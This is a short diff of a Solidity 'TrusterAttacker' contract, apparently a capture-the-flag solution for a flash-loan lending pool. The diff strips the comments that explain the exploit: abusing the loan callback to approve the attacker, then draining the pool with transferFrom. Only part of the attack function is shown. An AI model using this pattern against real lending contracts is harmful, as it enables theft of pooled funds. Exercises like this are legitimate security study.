@@ -14,7 +14,6 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/math/SafeMath.sol";
 
-// Truster Lender Pool interface 
 interface ITrusterLenderPool {
     function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
 }
@@ -25,9 +24,6 @@ contract TrusterAttacker {
 
     constructor() public {}
     
-    // Uses IERC20's approve function passing in our contract address as an argument 
-    // Then approves our contract to withdraw funds
-    // Ends with transferFrom to withdraw to our attacker account
     function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA) public {
         uint256 poolBalance = token.balanceOf(address(pool));
 
